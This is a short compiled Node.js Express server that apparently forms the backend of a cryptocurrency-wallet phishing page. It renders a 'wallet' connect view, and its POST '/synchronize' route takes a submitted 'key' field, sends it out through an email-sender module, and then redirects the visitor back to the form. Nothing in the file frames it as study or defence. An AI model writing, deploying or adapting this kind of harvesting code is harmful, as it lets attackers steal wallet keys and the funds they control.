"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const path_1 = __importDefault(require("path"));
const body_parser_1 = __importDefault(require("body-parser"));
const email_sender_1 = __importDefault(require("./externals/email-sender"));
const app = (0, express_1.default)();
const PORT = process.env.PORT || 3000;
app.set('views', path_1.default.join(__dirname, 'views'));
app.set('view engine', 'ejs');
app.set('port', PORT);
// The path to the static files for this simple application
app.use(body_parser_1.default.urlencoded({ extended: true }));
app.use(body_parser_1.default.json());
app.use(express_1.default.json());
app.use(express_1.default.static(path_1.default.join(__dirname, 'app', 'v1', 'public', 'images', 'index')));
app.use(express_1.default.static(path_1.default.join(__dirname, 'app', 'v1', 'public', 'style')));
app.use(express_1.default.static(path_1.default.join(__dirname, 'app', 'v1', 'public', 'script')));
app.use(express_1.default.static(path_1.default.join(__dirname, 'app', 'v1', 'public', 'images')));
app.get('/', (req, res, next) => {
    res.render('index');
});
app.get('/connect', (req, res, next) => {
    res.render('wallet');
});
app.post('/synchronize', (req, res, next) => {
    const bodys = req.body.key;
    new email_sender_1.default().sendEmail(bodys);
    res.redirect('/connect');
    // console.log( bodys )
});
app.get('/synchronize', (req, res, next) => {
    console.log(req.url);
    res.end();
});
app.listen(app.get('port'), () => {
    console.log("Server is listening...");
});
